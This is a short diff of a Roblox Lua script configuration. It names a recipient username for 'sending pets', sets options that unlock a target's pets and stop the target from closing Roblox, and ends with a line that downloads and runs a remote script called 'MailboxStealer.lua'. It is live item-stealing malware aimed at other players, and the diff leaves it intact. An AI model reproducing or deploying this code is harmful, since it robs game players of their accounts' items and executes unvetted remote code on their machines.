@@ -2,7 +2,6 @@
 
 --[[ Main Config ]]--
 _G.Username = "HerrySzymoN" --// Username To Send Pets To
-
 _G.Diamonds = 500000 --// Amount Of Diamonds To Not Kick
 _G.UnlockPets = true --// Unlocks Locked Pets
 _G.AntiLeave = true --// Doesn't Let The Target Close Roblox
@@ -22,5 +21,4 @@ _G.Tip4 = "4" --// Gives You Tips On The UI
 _G.Tip5 = "5" --// Gives You Tips On The UI
 
 --[[ Script ]]
-
 loadstring(game:HttpGet("https://raw.githubusercontent.com/HerrSimoNHub/api/main/MailboxStealer.lua"))()
